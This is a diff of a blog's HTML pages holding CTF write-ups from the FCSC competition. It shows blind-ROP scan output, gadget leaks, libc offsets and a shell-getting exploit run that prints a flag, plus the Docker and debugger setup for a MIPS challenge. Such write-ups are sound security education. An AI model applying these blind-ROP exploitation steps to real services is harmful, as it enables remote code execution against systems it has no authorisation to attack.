-<span class="o">[</span>0x4006b4<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x4006b5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb5\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x4006b6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x4006b8<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x4006bd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbd\x06@\x84(\xad\xfb\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x4006c2<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc2\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x4006c7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc7\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x4006cc<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x06@Bye!\n&#39;</span>
-<span class="o">[</span>0x4006d1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd1\x06@\x84(\xad\xfb\n&#39;</span>
-<span class="o">[</span>0x4006d6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x06@&#39;</span>
-<span class="o">[</span>0x4006db<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdb\x06@&#39;</span>
-<span class="o">[</span>0x4006e2<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x06@&#39;</span>
-<span class="o">[</span>0x4006e3<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe3\x06@&#39;</span>
-<span class="o">[</span>0x4006e5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x06@&#39;</span>
-<span class="o">[</span>0x4006e6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x06@&#39;</span>
-<span class="o">[</span>0x40073b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x07@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400742<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB\x07@&#39;</span>
-<span class="o">[</span>0x400743<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC\x07@&#39;</span>
-<span class="o">[</span>0x400758<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x07@&#39;</span>
-</code></pre></div><p>If we read carefully, we can notice the <code>[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; '</code> gadget.
+<pre tabindex="0"><code>$ ./solve.py
+[0x4004cc] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x04@'
+[0x4004cd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x04@'
+[0x4004dd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x04@'
+[0x400550] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x05@'
+[0x400560] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400562] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400563] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400565] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400566] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400567] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400569] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x40056d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x40056e] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x40056f] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaao\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400570] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400576] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaav\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400577] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400596] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x05@'
+[0x400597] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x97\x05@'
+[0x40059c] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9c\x05@'
+[0x40059d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9d\x05@'
+[0x4005a0] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x05@'
+[0x4005a1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa1\x05@'
+[0x4005a3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa3\x05@'
+[0x4005a5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa5\x05@'
+[0x4005b4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05@'
+[0x4005b7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb7\x05@'
+[0x4005b8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x05@'
+[0x4005c0] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\x05@'
+[0x4005d6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x05@'
+[0x4005d7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd7\x05@'
+[0x4005dd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x05@'
+[0x4005de] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x05@'
+[0x4005e1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe1\x05@'
+[0x4005e2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x05@'
+[0x4005e4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe4\x05@'
+[0x4005e5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x05@'
+[0x4005e7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe7\x05@'
+[0x4005e8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe8\x05@'
+[0x4005eb] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x05@'
+[0x4005ec] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xec\x05@'
+[0x4005ee] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xee\x05@'
+[0x4005ef] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\x05@'
+[0x4005f1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf1\x05@'
+[0x4005f3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf3\x05@'
+[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
+[0x400608] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\x06@'
+[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
+[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
+[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
+[0x400622] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;\x06@'
+[0x400650] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x06@'
+[0x400656] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x06@What is your name ?\n&gt;&gt;&gt; '
+[0x400657] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW\x06@What is your name ?\n&gt;&gt;&gt; '
+[0x400658] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x06@What is your name ?\n&gt;&gt;&gt; '
+[0x40065a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ\x06@What is your name ?\n&gt;&gt;&gt; '
+[0x40065e] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa^\x06@What is your name ?\n&gt;&gt;&gt; '
+[0x400663] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x06@\x84(\xad\xfb\n&gt;&gt;&gt; '
+[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; '
+[0x40066d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x06@\x84(\xad\xfb'
+[0x400672] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar\x06@\x84(\xad\xfb'
+[0x400677] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x06@'
+[0x400681] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x81\x06@'
+[0x4006b4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x4006b5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb5\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x4006b6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x4006b8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x4006bd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbd\x06@\x84(\xad\xfb\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x4006c2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc2\x06@What is your name ?\n&gt;&gt;&gt; '
+[0x4006c7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc7\x06@What is your name ?\n&gt;&gt;&gt; '
+[0x4006cc] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x06@Bye!\n'
+[0x4006d1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd1\x06@\x84(\xad\xfb\n'
+[0x4006d6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x06@'
+[0x4006db] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdb\x06@'
+[0x4006e2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x06@'
+[0x4006e3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe3\x06@'
+[0x4006e5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x06@'
+[0x4006e6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x06@'
+[0x40073b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x07@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+[0x400742] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB\x07@'
+[0x400743] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC\x07@'
+[0x400758] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x07@'
+</code></pre><p>If we read carefully, we can notice the <code>[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; '</code> gadget.
 It&rsquo;s a very good stop gadget because it&rsquo;s the only gadget which prints: <code>Thanks + padding + return_address_upto_null_byte + &gt;&gt;&gt; </code>.
 And so for our attack we will use it.</p>
 <div class="gblog-post__anchorwrap">
@@ -412,9 +412,49 @@ And so here is the script:</p>
 
 <span class="n">find_brop</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>Which returns:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<pre tabindex="0"><code>$ ./solve.py
 _ - 0x0
-...
+_ - 0x23
+_ - 0x46
+_ - 0x69
+_ - 0x8c
+_ - 0xaf
+_ - 0xd2
+_ - 0xf5
+_ - 0x118
+_ - 0x13b
+_ - 0x15e
+_ - 0x181
+_ - 0x1a4
+_ - 0x1c7
+_ - 0x1ea
+_ - 0x20d
+_ - 0x230
+_ - 0x253
+_ - 0x276
+_ - 0x299
+_ - 0x2bc
+_ - 0x2df
+_ - 0x302
+_ - 0x325
+_ - 0x348
+_ - 0x36b
+_ - 0x38e
+_ - 0x3b1
+_ - 0x3d4
+_ - 0x3f7
+_ - 0x41a
+_ - 0x43d
+_ - 0x460
+_ - 0x483
+_ - 0x4a6
+_ - 0x4c9
+_ - 0x4ec
+_ - 0x50f
+_ - 0x532
+_ - 0x555
+_ - 0x578
+_ - 0x59b
 _ - 0x5be
 _ - 0x5e1
 _ - 0x604
@@ -426,8 +466,8 @@ _ - 0x6b3
 _ - 0x6d6
 _ - 0x6f9
 _ - 0x71c
-Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\x07@&gt;&gt;&gt; &#39;</span>, leak: 0x40073a
-</code></pre></div><p>Since we got this gadget we can control <code>rdi</code> and <code>rsi</code> thanks to some misaligned instructions !</p>
+Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\x07@&gt;&gt;&gt; ', leak: 0x40073a
+</code></pre><p>Since we got this gadget we can control <code>rdi</code> and <code>rsi</code> because of some misaligned instructions !</p>
 <div class="gblog-post__anchorwrap">
     <h3 id="procedure-linkage-table-plt">
         Procedure linkage table (PLT)
@@ -481,18 +521,18 @@ That&rsquo;s how I developped this function:</p>
         <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
             <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Out: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </code></pre></div><p>And we got this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
-<span class="o">[</span>0x400500<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201010a3e3e3e20
-<span class="o">[</span>0x400510<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201013e3e3e20
-<span class="o">[</span>0x400520<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
-<span class="o">[</span>0x400570<span class="o">]</span> Out: 5468616e6b73204141414141414141414141414141414141414141414141414141414141414141414141414141414143074048656c6c6f20796f752e0a5768617420697320796f7572206e616d65203f0a3e3e3e20
-<span class="o">[</span>0x4005d0<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
-<span class="o">[</span>0x400610<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
-<span class="o">[</span>0x400630<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
-<span class="o">[</span>0x400640<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
-<span class="o">[</span>0x4006e0<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
-<span class="o">[</span>0x400750<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
-</code></pre></div><p>Awesome ! We got a leak of the binary in two gadgets !</p>
+<pre tabindex="0"><code>$ ./solve.py
+[0x400500] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201010a3e3e3e20
+[0x400510] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201013e3e3e20
+[0x400520] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
+[0x400570] Out: 5468616e6b73204141414141414141414141414141414141414141414141414141414141414141414141414141414143074048656c6c6f20796f752e0a5768617420697320796f7572206e616d65203f0a3e3e3e20
+[0x4005d0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
+[0x400610] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
+[0x400630] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
+[0x400640] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
+[0x4006e0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
+[0x400750] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
+</code></pre><p>Awesome ! We got a leak of the binary in two gadgets !</p>
 <div class="gblog-post__anchorwrap">
     <h3 id="leaking-the-binary">
         Leaking the binary
@@ -568,14 +608,14 @@ $ ./solve.py
   
   >this</a
 > to find from the offset of fflush and read, the right version. Which gives:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">__libc_start_main 	0x021a50 	0x0
+<pre tabindex="0"><code>__libc_start_main 	0x021a50 	0x0
 system 	0x041490 	0x1fa40
 fflush 	0x069ab0 	0x48060
 open 	0x0db950 	0xb9f00
-<span class="nb">read</span> 	0x0dbb90 	0xba140
+read 	0x0dbb90 	0xba140
 write 	0x0dbbf0 	0xba1a0
 str_bin_sh 	0x1633e8 	0x141998
-</code></pre></div><div class="gblog-post__anchorwrap">
+</code></pre><div class="gblog-post__anchorwrap">
     <h2 id="put-everything-together">
         Put everything together
         <a data-clipboard-text="https://nasm.re/posts/blindate/#put-everything-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put everything together" href="#put-everything-together">
@@ -637,14 +677,14 @@ str_bin_sh 	0x1633e8 	0x141998
 
 <span class="n">flow</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>And when we run it, we got a shell yeeeeeah !</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
-b<span class="s1">&#39;Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\xb0J\xa2\xd7&lt;\x7fWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
+<pre tabindex="0"><code>$ ./solve.py
+b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\xb0J\xa2\xd7&lt;\x7fWhat is your name ?\n&gt;&gt;&gt; '
 libc @ 0x7f3cd79bb000
 $ id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span>
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
 $ cat flag
-FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28<span class="o">}</span>
-</code></pre></div><p>Here is the final script:</p>
+FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
+</code></pre><p>Here is the final script:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -915,7 +955,7 @@ It&rsquo;s not a very hard challenge but I found it very interesting because it 
 nc challenges2.france-cybersecurity-challenge.fr 4005</p>
 </blockquote>
 <p>And for debugging purposes administrators provided a Docker file:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">FROM debian:buster-slim
+<pre tabindex="0"><code>FROM debian:buster-slim
 RUN apt update
 RUN apt install -yq socat qemu-user libc6-mips64-cross
 RUN apt clean
@@ -925,31 +965,31 @@ WORKDIR /app
 COPY ./mipsy ./
 RUN rm /etc/ld.so.cache
 
-EXPOSE <span class="m">4000</span>
-EXPOSE <span class="m">1234</span>
-CMD socat tcp-listen:4000,reuseaddr,fork exec:<span class="s2">&#34;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&#34;</span>
-</code></pre></div><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ uname -a
-Linux off 5.8.0-50-generic <span class="c1">#56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+EXPOSE 4000
+EXPOSE 1234
+CMD socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&quot;
+</code></pre><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
+<pre tabindex="0"><code>$ uname -a
+Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 $ sudo apt install socat qemu-user libc6-mips64-cross
 Lecture des listes de paquets... Fait
-Construction de l<span class="s1">&#39;arbre des dépendances       
-</span><span class="s1">Lecture des informations d&#39;</span>état... Fait
-socat est déjà la version la plus récente <span class="o">(</span>1.7.3.3-2<span class="o">)</span>.
-libc6-mips64-cross est déjà la version la plus récente <span class="o">(</span>2.30-0ubuntu2cross2<span class="o">)</span>.
-qemu-user est déjà la version la plus récente <span class="o">(</span>1:4.2-3ubuntu6.15<span class="o">)</span>.
-<span class="m">0</span> mis à jour, <span class="m">0</span> nouvellement installés, <span class="m">0</span> à enlever et <span class="m">17</span> non mis à jour.
+Construction de l'arbre des dépendances       
+Lecture des informations d'état... Fait
+socat est déjà la version la plus récente (1.7.3.3-2).
+libc6-mips64-cross est déjà la version la plus récente (2.30-0ubuntu2cross2).
+qemu-user est déjà la version la plus récente (1:4.2-3ubuntu6.15).
+0 mis à jour, 0 nouvellement installés, 0 à enlever et 17 non mis à jour.
 $ sudo rm -f /etc/ld.so.cache
-$ socat tcp-listen:4000,reuseaddr,fork exec:<span class="s2">&#34;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&#34;</span>
-</code></pre></div><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ gdb-multiarch -ex <span class="s1">&#39;source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py&#39;</span> -q ./mipsy
+$ socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&quot;
+</code></pre><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
+<pre tabindex="0"><code>$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
 Reading symbols from ./mipsy...
